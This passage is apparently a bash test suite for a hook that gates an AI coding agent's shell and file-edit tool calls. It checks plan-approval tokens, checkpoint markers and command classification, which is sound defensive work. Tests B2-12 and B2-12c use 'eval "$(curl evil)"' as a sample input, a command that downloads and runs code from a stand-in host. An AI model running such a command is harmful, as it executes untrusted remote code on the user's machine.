    # a subshell `(cd /tmp && ...)` to force hook $PWD = /tmp.
    P11_JSON="$(jq -n --arg tn 'Bash' --arg cmd "$P11_CMD" --arg cwd "$P11_REPO" --arg sid "$P11_SID" \
      '{tool_name: $tn, tool_input: {command: $cmd}, cwd: $cwd, session_id: $sid}')"
    P11_OUTPUT="$( (cd /tmp && echo "$P11_JSON" | HOME="$P11_HOME" CLAUDE_CODE_SESSION_ID="$P11_SID" bash "$HOOK") 2>/dev/null )"
    P11_EXIT=$?

    # Expected: gate allows (exit 0, empty output) because marker hit
    # surfaces read_only label → checkpoint-gate.sh exits early on read_only.
    if [ $P11_EXIT -eq 0 ] && [ -z "$P11_OUTPUT" ]; then
      echo "  ✓ AR-1. P1.1 round-trip: marker written under repo cwd, hit when hook \$PWD=/tmp but .cwd=repo (read_only allows under armed checkpoint)"
      ((passed++))
    else
      echo "  ✗ AR-1. P1.1 round-trip failed (exit=$P11_EXIT, output=$P11_OUTPUT)"
      ((failed++))
    fi

    # AR-2 RETIRED (planning-passive redesign, 2026-05-25): the former negative
    # control proved threading by relying on a cache MISS → shared_write →
    # pre-gate BLOCK. With Bash ungated, shared_write no longer blocks, so the
    # gate can't discriminate hit-vs-miss for a `node` command (both labels
    # allow). The caller_cwd cache-key sensitivity that this asserted is owned
    # by tests/test-classifier-marker.mjs §M5 (cross-repo refusal) and §M6
    # (caller-cwd may differ from project-root), which test the marker layer
    # directly rather than through the now-label-agnostic gate.
  else
    echo "  ⊘ AR-1/AR-2 skipped: classifier-marker.mjs write did not produce marker (sandboxed env or helper rejected)"
  fi

  rm -rf "$P11_REPO" "$P11_HOME"
else
  echo "  ⊘ AR-1/AR-2 skipped: real classifier-marker.mjs not reachable at $REAL_HELPER"
fi

# ============================================================================
echo ""
echo "--- Planning-passive redesign: nothing armed at rest; first repo write arms (2026-05-25) ---"
# ============================================================================
# Core invariants of the planning-passive + planapproval redesign:
#   (1) With NOTHING armed and NO approved-plan token, planning/review/
#       exploration never blocks and never arms — read-only Bash, node
#       inspections, shared_write review commands, AND repo-source edits all
#       pass cleanly with zero marker side effects (NO CHECKPOINTS DURING
#       PLANNING; no plan ⇒ no implementation gate).
#   (2) Once a plan is approved (.plan-approved.<sid> token present), the first
#       repo-source Edit/Write arms .checkpoint-required for the session AND
#       blocks (the implementation boundary), CONSUMING the token (one-shot).
#   (3) Off-repo writes (memory/skills/settings) are allowed and never arm.
#   (4) Arming is per-session and per-repo: sessions and projects don't bleed.
PP_REPO="$(mktemp -d)"; PP_REPO="$(cd -P "$PP_REPO" && pwd)"
git -C "$PP_REPO" init -q 2>/dev/null
PP_MARKER_DIR="$PP_REPO/.checkpoints"
mkdir -p "$PP_MARKER_DIR"
PP_SID_A="11111111-aaaa-4aaa-8aaa-111111111111"
PP_SID_B="22222222-bbbb-4bbb-8bbb-222222222222"

mock_pp_bash() {  # $1=command $2=sid
  jq -n --arg cmd "$1" --arg cwd "$PP_REPO" --arg sid "$2" \
    '{tool_name: "Bash", tool_input: {command: $cmd}, cwd: $cwd, session_id: $sid}'
}
mock_pp_edit() {  # $1=abs file_path $2=sid $3=cwd(optional, default PP_REPO)
  jq -n --arg fp "$1" --arg cwd "${3:-$PP_REPO}" --arg sid "$2" \
    '{tool_name: "Edit", tool_input: {file_path: $fp}, cwd: $cwd, session_id: $sid}'
}
reset_pp() { rm -rf "$PP_MARKER_DIR"; mkdir -p "$PP_MARKER_DIR"; }

# (1) Planning-passive — nothing armed, nothing blocks, nothing arms
reset_pp
assert_allowed "PP-1. read-only Bash (git status) allowed, nothing armed" \
  "$(mock_pp_bash 'git status' "$PP_SID_A")"
assert_allowed "PP-2. node em-search (read_only) allowed, nothing armed" \
  "$(mock_pp_bash 'node scripts/em-search.mjs --tag x' "$PP_SID_A")"
# Agent-classifier-first (2026-05-26): a novel review command (second-opinion
# dispatch is interpreter_other → shared_write, an UNEVALUATED-novel reason) is
# HELD for agent classification — it BLOCKS with the 3-way deny-hint but does NOT
# arm .checkpoint-required. The agent classifies it once (read_only / nonsrc_write)
# and it is free thereafter (G1). (Was: arms + blocks — pre-arming a not-yet-
# evaluated command framed planning-time inspection as implementation.)
assert_blocked "PP-3. novel review command blocks (held for classification, no pre-arm)" \
  "$(mock_pp_bash 'node scripts/second-opinion.mjs request --provider codex --dispatch' "$PP_SID_A")" \
  "Classify it ONCE"
assert_marker_absent "PP-4. novel interpreter_other Bash did NOT arm .checkpoint-required.<sidA> (agent-classifier-first)" \
  "$PP_MARKER_DIR/.checkpoint-required.$PP_SID_A"
assert_marker_absent "PP-4b. planning Bash did NOT arm legacy .checkpoint-required" \
  "$PP_MARKER_DIR/.checkpoint-required"
# planapproval: an in-repo Edit with NO approved-plan token is PLANNING →
# allowed, and never arms (NO CHECKPOINTS DURING PLANNING).
assert_allowed "PP-4c. in-repo Edit with no approval → allowed (planning)" \
  "$(mock_pp_edit "$PP_REPO/scripts/foo.mjs" "$PP_SID_A")"
assert_marker_absent "PP-4d. unapproved in-repo Edit did NOT arm .checkpoint-required.<sidA>" \
  "$PP_MARKER_DIR/.checkpoint-required.$PP_SID_A"

# (2) Approved implementation — first repo-source Edit arms + blocks + consumes token
reset_pp
seed_approval "$PP_MARKER_DIR" "$PP_SID_A"
assert_blocked "PP-5. first in-repo Edit (approved) blocks at implementation boundary" \
  "$(mock_pp_edit "$PP_REPO/scripts/foo.mjs" "$PP_SID_A")" "Checkpoint required"
assert_marker_exists "PP-6. first in-repo Edit (approved) armed .checkpoint-required.<sidA>" \
  "$PP_MARKER_DIR/.checkpoint-required.$PP_SID_A"
assert_marker_absent "PP-6b. arm consumed the approval token .plan-approved.<sidA>" \
  "$PP_MARKER_DIR/.plan-approved.$PP_SID_A"

# (3) After the session's pre-checkpoint is written → Edit allowed + post armed
echo "Rule 18 pre-checkpoint" > "$PP_MARKER_DIR/.pre-checkpoint-done.$PP_SID_A"
assert_allowed "PP-7. in-repo Edit allowed after pre-checkpoint written (session A)" \
  "$(mock_pp_edit "$PP_REPO/scripts/foo.mjs" "$PP_SID_A")"
assert_marker_exists "PP-8. allowed Edit armed .post-checkpoint-required.<sidA>" \
  "$PP_MARKER_DIR/.post-checkpoint-required.$PP_SID_A"

# (4) Off-repo Edit allowed + never arms
reset_pp
OFFREPO_PP="$(mktemp -d)"; OFFREPO_PP="$(cd -P "$OFFREPO_PP" && pwd)"
assert_allowed "PP-9. off-repo Edit allowed (planning-passive smart-arming)" \
  "$(mock_pp_edit "$OFFREPO_PP/memory/note.md" "$PP_SID_A")"
assert_marker_absent "PP-10. off-repo Edit did NOT arm .checkpoint-required.<sidA>" \
  "$PP_MARKER_DIR/.checkpoint-required.$PP_SID_A"
rm -rf "$OFFREPO_PP"

# (5) Multisession — two sids arm independently; one's pre-done doesn't unblock the other
reset_pp
seed_approval "$PP_MARKER_DIR" "$PP_SID_A"
seed_approval "$PP_MARKER_DIR" "$PP_SID_B"
echo "$(mock_pp_edit "$PP_REPO/scripts/a.mjs" "$PP_SID_A")" | run_hook >/dev/null 2>&1
echo "$(mock_pp_edit "$PP_REPO/scripts/b.mjs" "$PP_SID_B")" | run_hook >/dev/null 2>&1
assert_marker_exists "PP-11. session A armed its own .checkpoint-required.<sidA>" \
  "$PP_MARKER_DIR/.checkpoint-required.$PP_SID_A"
assert_marker_exists "PP-12. session B armed its own .checkpoint-required.<sidB>" \
  "$PP_MARKER_DIR/.checkpoint-required.$PP_SID_B"
echo "pre A" > "$PP_MARKER_DIR/.pre-checkpoint-done.$PP_SID_A"
assert_allowed "PP-13. session A unblocked by its OWN pre-done" \
  "$(mock_pp_edit "$PP_REPO/scripts/a.mjs" "$PP_SID_A")"
assert_blocked "PP-14. session B still blocked (independent pre-done)" \
  "$(mock_pp_edit "$PP_REPO/scripts/b.mjs" "$PP_SID_B")" "Checkpoint required"

# (6) Multiproject — edit in repo A never arms repo B
reset_pp
seed_approval "$PP_MARKER_DIR" "$PP_SID_A"
PP_REPO_B="$(mktemp -d)"; PP_REPO_B="$(cd -P "$PP_REPO_B" && pwd)"
git -C "$PP_REPO_B" init -q 2>/dev/null
mkdir -p "$PP_REPO_B/.checkpoints"
echo "$(mock_pp_edit "$PP_REPO/scripts/x.mjs" "$PP_SID_A")" | run_hook >/dev/null 2>&1
assert_marker_exists "PP-15. edit in repo A armed A's .checkpoint-required.<sidA>" \
  "$PP_MARKER_DIR/.checkpoint-required.$PP_SID_A"
assert_marker_absent "PP-16. edit in repo A did NOT arm repo B's .checkpoint-required.<sidA>" \
  "$PP_REPO_B/.checkpoints/.checkpoint-required.$PP_SID_A"
rm -rf "$PP_REPO_B" "$PP_REPO"

# ============================================================================
# #349: a classifier-marker.mjs invocation whose path contains SPACES is
# extracted via the de-quoting _tokenize tokenizer (not whitespace-split awk), so
# the gate processes it cleanly — no tokenizer error leaks, marker write allowed.
# (Pre-fix the awk split produced a broken `'/My` fragment; deep extraction
# coverage rides on the 361-test _tokenize suite in test-command-classifier.sh.)
F1_SPACE_BASE="$(mktemp -d)"
F1_SPACE_REPO="$F1_SPACE_BASE/My Repo Dir"
mkdir -p "$F1_SPACE_REPO/scripts" "$F1_SPACE_REPO/.checkpoints"
git -C "$F1_SPACE_REPO" init -q 2>/dev/null
echo "// marker helper" > "$F1_SPACE_REPO/scripts/classifier-marker.mjs"
f1_space_out="$(jq -n \
  --arg cmd "node '$F1_SPACE_REPO/scripts/classifier-marker.mjs' --write --project-root '$F1_SPACE_REPO' --caller-cwd '$F1_SPACE_REPO' --command x --label read_only --confidence 0.9 --session-id 33333333-cccc-4ccc-8ccc-333333333333" \
  --arg cwd "$F1_SPACE_REPO" --arg sid "33333333-cccc-4ccc-8ccc-333333333333" \
  '{tool_name:"Bash", tool_input:{command:$cmd}, cwd:$cwd, session_id:$sid}' | run_hook 2>&1 || true)"
if echo "$f1_space_out" | grep -q "tokenize"; then
  echo "  ✗ #349. spaced classifier-marker path leaked a tokenizer error: $f1_space_out"; ((failed++))
else
  echo "  ✓ #349. spaced classifier-marker path processed cleanly (de-quote extraction)"; ((passed++))
fi
rm -rf "$F1_SPACE_BASE"

# ============================================================================
echo ""
echo "--- PR-B2 (#351): Bash nonsrc_write free-flow + shared_write arm + 3-way hint ---"
# ============================================================================
# nonsrc_write Bash (git metadata, package installs, dir ops, em-store) flows
# FREE — never arms the pre-checkpoint (the inversion: only repo-source /
# can't-tell writes arm).
reset_state
assert_allowed "B2-1. git commit (nonsrc_write) allowed in idle" \
  "$(mock_json 'Bash' 'git commit -m wip')"
assert_allowed "B2-2. npm install (nonsrc_write) allowed in idle" \
  "$(mock_json 'Bash' 'npm install')"
assert_allowed "B2-3. mkdir (nonsrc_write) allowed in idle" \
  "$(mock_json 'Bash' 'mkdir -p src/new')"
assert_allowed "B2-4. node em-store (nonsrc_write) allowed in idle" \
  "$(mock_json 'Bash' 'node scripts/em-store.mjs --project x')"
assert_marker_absent "B2-5. no nonsrc_write command armed .checkpoint-required" "$PRE_REQ"

# Agent-classifier-first (2026-05-26, user design decision): an UNEVALUATED novel
# command — the classifier's conservative cache-miss defaults (default_write /
# interpreter_other) — is HELD for agent classification (block + 3-way hint) but
# does NOT arm .checkpoint-required. The block is the fail-closed mechanism; arming
# is deferred to the agent verdict. (Was: arms + blocks — that framed read-only
# inspection like `shasum` as implementation and left a lingering marker that
# deadlocked the stop-gate.)
reset_state
assert_blocked "B2-6. novel shared_write Bash (cp, default_write) blocks (held for classification)" \
  "$(mock_json 'Bash' 'cp /etc/hosts scripts/x.txt')" "Classify it ONCE"
assert_marker_absent "B2-7. novel shared_write Bash did NOT arm .checkpoint-required (agent-classifier-first)" "$PRE_REQ"
# interpreter_other (a non-allowlisted node script) is the SAME unevaluated-novel
# class — also held, also no arm. This is the canonical node-script friction.
reset_state
assert_blocked "B2-7c. novel interpreter_other Bash (node foo.mjs) blocks (held)" \
  "$(mock_json 'Bash' 'node scripts/foo.mjs --run')" "Classify it ONCE"
assert_marker_absent "B2-7d. novel interpreter_other Bash did NOT arm" "$PRE_REQ"
# Boundary guard: a RECOGNIZED write reason (allowlisted cmd + redirect →
# readonly_cmd_redirected) is NOT unevaluated-novel and STILL arms conservatively
# — but ONLY when a plan is approved (planapproval redesign). Seed the token.
reset_state
B2_SID="55555555-eeee-4eee-8eee-555555555555"
seed_approval "$MARKER_DIR" "$B2_SID"
assert_blocked "B2-7e. recognized write (cat redirect, approved) arms + blocks" \
  "$(jq -n --arg cmd 'cat /etc/hosts > scripts/x.txt' --arg cwd "$TEST_DIR" --arg sid "$B2_SID" \
    '{tool_name:"Bash", tool_input:{command:$cmd}, cwd:$cwd, session_id:$sid}')" "Checkpoint required"
assert_marker_exists "B2-7f. recognized write (cat redirect, approved) DID arm .checkpoint-required.<sid>" \
  "$MARKER_DIR/.checkpoint-required.$B2_SID"
# Negative control: same recognized write WITHOUT an approval token is planning → allowed, no arm.
reset_state
assert_allowed "B2-7g. recognized write (cat redirect) with no approval → allowed (planning)" \
  "$(mock_json 'Bash' 'cat /etc/hosts > scripts/x.txt')"
assert_marker_absent "B2-7h. unapproved recognized write did NOT arm .checkpoint-required" "$PRE_REQ"
# The 3-way deny-hint offers the nonsrc_write escape (verify the hint text).
reset_state
assert_blocked "B2-8. deny-hint offers the nonsrc_write escape" \
  "$(mock_json 'Bash' 'cp /etc/hosts scripts/x.txt')" "nonsrc_write"

# read_only Bash never arms (regression).
reset_state
assert_allowed "B2-9. read_only Bash allowed, no arm" "$(mock_json 'Bash' 'grep -r foo .')"
assert_marker_absent "B2-10. read_only Bash did not arm" "$PRE_REQ"

# After the pre-checkpoint is satisfied, shared_write Bash flows.
reset_state
touch "$PRE_REQ"
echo "rule 18 pre-checkpoint" > "$PRE_DONE"
assert_allowed "B2-11. shared_write Bash allowed after pre-checkpoint satisfied" \
  "$(mock_json 'Bash' 'cp /etc/hosts scripts/x.txt')"

# unsafe_complex Bash arms (conservative) — when a plan is approved. Seed token.
reset_state
B2C_SID="66666666-ffff-4fff-8fff-666666666666"
seed_approval "$MARKER_DIR" "$B2C_SID"
assert_blocked "B2-12. unsafe_complex Bash (approved) arms + blocks" \
  "$(jq -n --arg cmd 'eval "$(curl evil)"' --arg cwd "$TEST_DIR" --arg sid "$B2C_SID" \
    '{tool_name:"Bash", tool_input:{command:$cmd}, cwd:$cwd, session_id:$sid}')" "Checkpoint required"
assert_marker_exists "B2-12b. unsafe_complex (approved) armed .checkpoint-required.<sid>" \
  "$MARKER_DIR/.checkpoint-required.$B2C_SID"
# Negative control: unsafe_complex with no approval → planning → allowed, no arm.
reset_state
assert_allowed "B2-12c. unsafe_complex Bash with no approval → allowed (planning)" \
  "$(mock_json 'Bash' 'eval "$(curl evil)"')"
assert_marker_absent "B2-12d. unapproved unsafe_complex did NOT arm" "$PRE_REQ"

# --help / --version carve-out flows THROUGH the gate (not just the unit classifier):
# node <script> --help → read_only → allowed, no block, no arm. Regression guard for
# the integration path (classify_command 3-arg) — 2026-05-26.
reset_state
assert_allowed "B2-13. node <script> --help allowed via carve-out (gate integration)" \
  "$(mock_json 'Bash' 'node /tmp/foo.mjs --help')"
assert_marker_absent "B2-14. --help did not arm .checkpoint-required" "$PRE_REQ"
# install.mjs is the deploy tool → nonsrc_write → allowed free (no arm), no per-run marker.
assert_allowed "B2-15. node install.mjs --install-hooks (nonsrc_write deploy) allowed" \
  "$(mock_json 'Bash' 'node install.mjs --tool claude-code --install-hooks --install-hooks-force')"
assert_marker_absent "B2-16. install deploy did not arm" "$PRE_REQ"

# ============================================================================
echo ""
echo "--- PR-B2 (#351, B1): push self-arm full cycle (fallback-touch path) ---"
# ============================================================================
reset_state
# Push with no prior checkpoint: self-arms POST_REQ this invocation + blocks
# (B1 — push is an INDEPENDENT hard gate even when the pre-checkpoint was
# escaped via D7). Exercises the existence-before-touch fallback (TEST_HOME has
# no checkpoint-marker.mjs helper). The noop-parse helper path is an impl/code-
# review-tier two-process repro (§15-C3).
assert_blocked "B1-1. push self-arms + blocks (no prior checkpoint)" \
  "$(mock_json 'Bash' 'git push origin main')" "Post-implementation checkpoint required"
assert_marker_exists "B1-2. push self-armed .post-checkpoint-required" "$POST_REQ"
# Write the post-checkpoint, then the push is allowed. The POST pair is now
# own-session-sticky (kept across a delivery's push-class actions), so it is NOT
# swept here — a follow-on gh pr create / pr review reuses it without re-block.
echo "e2e done" > "$POST_DONE"
assert_allowed "B1-3. push allowed after post-checkpoint written" \
  "$(mock_json 'Bash' 'git push origin main')"
assert_marker_exists "B1-4. allowed push KEPT .post-checkpoint-required (sticky)" "$POST_REQ"
assert_marker_exists "B1-5. allowed push KEPT .post-checkpoint-done (sticky)" "$POST_DONE"

# ============================================================================
echo ""
echo "--- PR-B2 S3 (#351, §11): Edit/Write path verdict + .review-store carve-out ---"
# ============================================================================
# The Edit/Write pre-gate was a pure path heuristic (any in-repo write armed),
# which over-arms on plan/scratch/doc files cross-tool harnesses stage in-repo.
# S3 lets the agent downgrade a specific TARGET path to nonsrc_write/read_only
# via `classifier-marker.mjs --target-path`; the gate consults the verdict in
# _tool_call_targets_repo_source.
#
# CRITICAL setup: the NC carve-out tests above `touch` an EMPTY stub at
# $TEST_HOME/.episodic-memory/scripts/classifier-marker.mjs. agent_classify_path
# resolves the global helper first, so under that polluted HOME the gate would
# read the empty stub (miss → never downgrade). Use a FRESH clean HOME for the
# PV section so the gate resolves the real repo-source (v2) helper — the same
# one write_path_verdict uses — and the canonical path key round-trips.
PV_PREV_HOME="$TEST_HOME"
TEST_HOME="$(mktemp -d)"
TEST_HOME="$(cd -P "$TEST_HOME" && pwd)"
trap 'cleanup; rm -rf "$PV_PREV_HOME"' EXIT

PV_SID="pvsid-s3-$$"
REPO_MARKER="$REPO_ROOT/scripts/classifier-marker.mjs"
PV_TARGET="$TEST_DIR/scripts/generated.mjs"
# A session_id'd call arms the session-namespaced marker (touch fallback — the
# clean HOME has no checkpoint-marker.mjs helper), not the legacy literal.
PV_PRE_REQ="$MARKER_DIR/.checkpoint-required.$PV_SID"

# Edit tool JSON carrying a session_id, so the gate threads a stable
# CLAUDE_CODE_SESSION_ID to agent_classify_path.
pv_edit_json() {
  jq -n --arg fp "$1" --arg cwd "$TEST_DIR" --arg sid "$PV_SID" \
    '{tool_name: "Edit", tool_input: {file_path: $fp}, cwd: $cwd, session_id: $sid}'
}

# Write a path verdict for <target> with <label> under PV_SID (the session the
# gate reads). From TEST_DIR so the helper cross-repo check passes;
# CLAUDE_CODE_SESSION_ID empty so it doesn't conflict with --session-id.
write_path_verdict() {
  ( cd "$TEST_DIR" && CLAUDE_CODE_SESSION_ID="" \
      node "$REPO_MARKER" --write \
      --project-root "$TEST_DIR" --caller-cwd "$TEST_DIR" \
      --target-path "$1" --session-id "$PV_SID" \
      --label "$2" --confidence 0.9 --reason "s3 test verdict" >/dev/null 2>&1 )
}

# PV-1/2: no verdict + in-repo target + APPROVED plan → block WITH the 2-way path
# hint, and arm (planapproval redesign: arming requires the approval token).
reset_state
seed_approval "$MARKER_DIR" "$PV_SID"
assert_blocked "PV-1. in-repo Edit (approved), no path verdict → block with 2-way path hint" \
  "$(pv_edit_json "$PV_TARGET")" "nonsrc_write"
assert_marker_exists "PV-2. PV-1 armed .checkpoint-required (session-namespaced)" "$PV_PRE_REQ"
# Negative control: same edit with NO approval token → planning → allowed, no arm.
reset_state
assert_allowed "PV-2b. in-repo Edit with no approval → allowed (planning)" \
  "$(pv_edit_json "$PV_TARGET")"
assert_marker_absent "PV-2c. unapproved in-repo Edit did NOT arm" "$PV_PRE_REQ"

# PV-3/4: nonsrc_write path verdict → Edit downgraded → ALLOWED, no arm.
reset_state
write_path_verdict "$PV_TARGET" "nonsrc_write"
assert_allowed "PV-3. nonsrc_write path verdict → Edit allowed (downgrade)" \
  "$(pv_edit_json "$PV_TARGET")"
assert_marker_absent "PV-4. PV-3 did NOT arm .checkpoint-required" "$PV_PRE_REQ"

# PV-5/6: read_only path verdict also downgrades.
reset_state
write_path_verdict "$PV_TARGET" "read_only"
assert_allowed "PV-5. read_only path verdict → Edit allowed (downgrade)" \
  "$(pv_edit_json "$PV_TARGET")"
assert_marker_absent "PV-6. PV-5 did NOT arm" "$PV_PRE_REQ"

# PV-7: shared_write verdict must NOT downgrade (only nonsrc_write/read_only do).
# Approved plan seeded so the non-downgraded edit reaches the arm + block.
reset_state
seed_approval "$MARKER_DIR" "$PV_SID"
write_path_verdict "$PV_TARGET" "shared_write"
assert_blocked "PV-7. shared_write path verdict (approved) does NOT downgrade → block" \
  "$(pv_edit_json "$PV_TARGET")" "Checkpoint required"

# PV-8: verdict for a DIFFERENT path does not downgrade THIS target (specificity).
reset_state
seed_approval "$MARKER_DIR" "$PV_SID"
write_path_verdict "$TEST_DIR/scripts/other.mjs" "nonsrc_write"
assert_blocked "PV-8. verdict specificity (approved): other path's verdict → this target still blocks" \
  "$(pv_edit_json "$PV_TARGET")" "Checkpoint required"

# PV-9/10: .review-store/ carve-out — review artifacts never arm, no verdict needed.
reset_state
assert_allowed "PV-9. .review-store/ target → allowed (carve-out)" \
  "$(pv_edit_json "$TEST_DIR/.review-store/codex/req-123.md")"
assert_marker_absent "PV-10. .review-store/ did NOT arm" "$PV_PRE_REQ"

# ============================================================================
echo "--- Non-source write carve-outs (#354 FU): .checkpoints/ + .gitignore ---"
# ============================================================================
# 2026-05-27 (user-directed): writes to non-source paths must NOT arm the Rule 18
# pre-checkpoint. The command-classification deny-hint itself instructs the agent
# to Write <repo>/.checkpoints/classify/pending-*.cmd; arming on that deadlocked
# the classify protocol (reproduced this session). Generalized to anything
# git-ignored (episodes under .episodic-memory/, scratch/, etc.) so the gate
# defers to git's notion of source instead of an enumerated directory list.

# PV-11/12: .checkpoints/classify/pending-*.cmd → allowed via (1b), no arm.
# This is the exact deadlock the deny-hint's prescribed write hit.
reset_state
assert_allowed "PV-11. .checkpoints/classify/pending-*.cmd → allowed (.checkpoints carve-out)" \
  "$(pv_edit_json "$TEST_DIR/.checkpoints/classify/pending-deadbeef.cmd")"
assert_marker_absent "PV-12. PV-11 did NOT arm" "$PV_PRE_REQ"

# The (1c) gitignore carve-out needs a real .gitignore in the test repo (git
# init'd clean above). Create it now — it only affects the tests below.
printf '%s\n' '.episodic-memory/' 'scratch/' 'analysis/' > "$TEST_DIR/.gitignore"

# PV-13/14: .episodic-memory/ episode write → allowed via (1c gitignore), no arm.
reset_state
assert_allowed "PV-13. .episodic-memory/ episode write → allowed (gitignore carve-out)" \
  "$(pv_edit_json "$TEST_DIR/.episodic-memory/episodes/ep-1.json")"
assert_marker_absent "PV-14. PV-13 did NOT arm" "$PV_PRE_REQ"

# PV-15/16: an arbitrary gitignored scratch path → allowed (proves the general
# mechanism, not just episodes/.checkpoints).
reset_state
assert_allowed "PV-15. gitignored scratch/ path → allowed (gitignore carve-out)" \
  "$(pv_edit_json "$TEST_DIR/scratch/draft-plan.md")"
assert_marker_absent "PV-16. PV-15 did NOT arm" "$PV_PRE_REQ"

# PV-17/18: NEGATIVE CONTROL — a tracked, NON-ignored source file (with .gitignore
# now present) must STILL arm + block under an approved plan. Proves git
# check-ignore returns "not ignored" for real source and the carve-outs did not
# over-broaden.
reset_state
seed_approval "$MARKER_DIR" "$PV_SID"
assert_blocked "PV-17. tracked source file (approved, not ignored) → still blocks" \
  "$(pv_edit_json "$TEST_DIR/hooks/checkpoint-gate.sh")" "Checkpoint required"
assert_marker_exists "PV-18. PV-17 still armed .checkpoint-required" "$PV_PRE_REQ"

# ============================================================================
echo ""
echo "--- Deadlock-combo regression (planapproval, 2026-05-27) ---"
# ============================================================================
# Root cause being fixed: a PLANNING session that wrote .pre-checkpoint-done /
# .post-checkpoint-done as gate bookkeeping armed .checkpoint-required via the
# old file-write heuristic. The stop-gate (enforce-contract.mjs --gate stop) then
# blocked turn-end because .checkpoint-required was armed with no
# .post-checkpoint-done — and the post-done write was itself refused because
# .post-checkpoint-required was never armed → DEADLOCK during planning.
#
# The fix anchors arming to the approval token: NO approval ⇒ no arm ⇒ no
# lingering .checkpoint-required ⇒ the stop-gate never trips. These tests assert
# the checkpoint-gate side of that invariant (the marker the stop-gate keys on
# is never created during planning), the approved lifecycle still arms, and the
# token consume is prefix-collision safe.

# DL-1/2: THE deadlock root — planning writes .pre-checkpoint-done with NO
# approval. The marker write is allowed, but it must NOT arm .checkpoint-required
# (under the OLD heuristic this arm is exactly what deadlocked the stop-gate).
reset_state
DL_SID="bbbbbbbb-2222-4222-8222-bbbbbbbbbbbb"
assert_allowed "DL-1. planning writes .pre-checkpoint-done (no approval) → allowed (marker write)" \
  "$(jq -n --arg cmd "echo 'planning bookkeeping' > $MARKER_DIR/.pre-checkpoint-done.$DL_SID" \
    --arg cwd "$TEST_DIR" --arg sid "$DL_SID" \
    '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')"
assert_marker_absent "DL-2. planning pre-done write did NOT arm .checkpoint-required.<sid> (deadlock root fixed)" \
  "$MARKER_DIR/.checkpoint-required.$DL_SID"
assert_marker_absent "DL-2b. nor the legacy .checkpoint-required literal" \
  "$MARKER_DIR/.checkpoint-required"

# DL-3: planning attempts a premature .post-checkpoint-done write (no approval,
# no .post-checkpoint-required) — still blocked (can't fake a post-checkpoint),
# and crucially leaves NO armed .checkpoint-required behind.
reset_state
assert_blocked "DL-3. planning premature post-done write blocked (no post-required)" \
  "$(jq -n --arg cmd "echo 'x' > $MARKER_DIR/.post-checkpoint-done.$DL_SID" \
    --arg cwd "$TEST_DIR" --arg sid "$DL_SID" \
    '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')" "Checkpoint required"
assert_marker_absent "DL-4. premature post-done attempt did NOT arm .checkpoint-required.<sid>" \
  "$MARKER_DIR/.checkpoint-required.$DL_SID"

# DL-5: approved lifecycle — the SAME pre-done write, but WITH an approval token,
# DOES keep a real checkpoint. Edit arms+consumes; then the pre-done write is the
# normal implementation flow. Contrast with DL-1/2 (planning).
reset_state
DL_SID_OK="cccccccc-3333-4333-8333-cccccccccccc"
seed_approval "$MARKER_DIR" "$DL_SID_OK"
echo "$(jq -n --arg fp "$TEST_DIR/scripts/impl.mjs" --arg cwd "$TEST_DIR" --arg sid "$DL_SID_OK" \
  '{tool_name:"Edit",tool_input:{file_path:$fp},cwd:$cwd,session_id:$sid}')" | run_hook >/dev/null 2>&1
assert_marker_exists "DL-5. approved in-repo Edit armed .checkpoint-required.<sid>" \
  "$MARKER_DIR/.checkpoint-required.$DL_SID_OK"
assert_marker_absent "DL-6. arm consumed the approval token (one-shot)" \
  "$MARKER_DIR/.plan-approved.$DL_SID_OK"

# DL-7/8: gate-side consume is prefix-collision safe (codex R2 P1 — sid=X must
# not clobber a sibling whose name starts with X). Seed approval for DL_SID_OK2
# AND a sibling file `.plan-approved.<DL_SID_OK2>-sib`; arming for DL_SID_OK2
# must remove ONLY the exact token, leaving the sibling intact.
reset_state
DL_SID_OK2="dddddddd-4444-4444-8444-dddddddddddd"
seed_approval "$MARKER_DIR" "$DL_SID_OK2"
: > "$MARKER_DIR/.plan-approved.${DL_SID_OK2}-sib"
echo "$(jq -n --arg fp "$TEST_DIR/scripts/impl2.mjs" --arg cwd "$TEST_DIR" --arg sid "$DL_SID_OK2" \
  '{tool_name:"Edit",tool_input:{file_path:$fp},cwd:$cwd,session_id:$sid}')" | run_hook >/dev/null 2>&1
assert_marker_absent "DL-7. consume removed the EXACT approval token .plan-approved.<sid>" \
  "$MARKER_DIR/.plan-approved.$DL_SID_OK2"
assert_marker_exists "DL-8. consume did NOT clobber prefix-collision sibling .plan-approved.<sid>-sib" \
  "$MARKER_DIR/.plan-approved.${DL_SID_OK2}-sib"

# DL-9/10: review F1 regression — a CONCURRENT session's live .plan-approved
# token must SURVIVE another session's push sweep. `.plan-approved` is
# deliberately excluded from CHECKPOINT_CLEANUP_MARKERS so the push glob
# (`<marker>.*`, all sessions) does NOT delete it — otherwise session B would
# silently skip its pre-checkpoint after session A pushes. The PRE pair is still
# swept on push; the POST pair is now own-session-sticky and intentionally KEPT
# (see DL-10 + the "Push allowed sweeps PRE pair, keeps POST pair sticky" block).
reset_state
DL_SID_B="eeeeeeee-5555-4555-8555-eeeeeeeeeeee"
: > "$MARKER_DIR/.plan-approved.$DL_SID_B"     # session B's live approval token (pre-arm)
touch "$POST_REQ"                               # session A's post-checkpoint armed
echo "e2e done" > "$POST_DONE"                  # and satisfied → push is allowed → cleanup runs
echo "$(mock_json 'Bash' 'git push origin main')" | run_hook >/dev/null 2>&1   # allowed push → cleanup sweep
assert_marker_exists "DL-9. concurrent session's .plan-approved token SURVIVED another session's push sweep (F1)" \
  "$MARKER_DIR/.plan-approved.$DL_SID_B"
assert_marker_exists "DL-10. push KEPT the satisfied .post-checkpoint-done (POST pair sticky across a delivery)" \
  "$POST_DONE"

# DL-11/12/13: codex PR-review P1 regression — a FAILING installed arm helper
# must NOT consume the approval token while leaving the write ungated. The
# arm/consume is transactional: if `checkpoint-marker.mjs` exits non-zero (no
# .checkpoint-required created), the token is PRESERVED and the write fails
# CLOSED (still blocked), so a retry can arm. (Was: `|| true` swallowed the
# failure, consume ran unconditionally → token gone + no checkpoint + write
# ALLOWED ungated.)
reset_state
DL_FAIL_HOME=$(mktemp -d)
mkdir -p "$DL_FAIL_HOME/.episodic-memory/scripts"
printf '#!/usr/bin/env node\nprocess.exit(1)\n' > "$DL_FAIL_HOME/.episodic-memory/scripts/checkpoint-marker.mjs"
DL_FAIL_SID="ffffffff-6666-4666-8666-ffffffffffff"
seed_approval "$MARKER_DIR" "$DL_FAIL_SID"
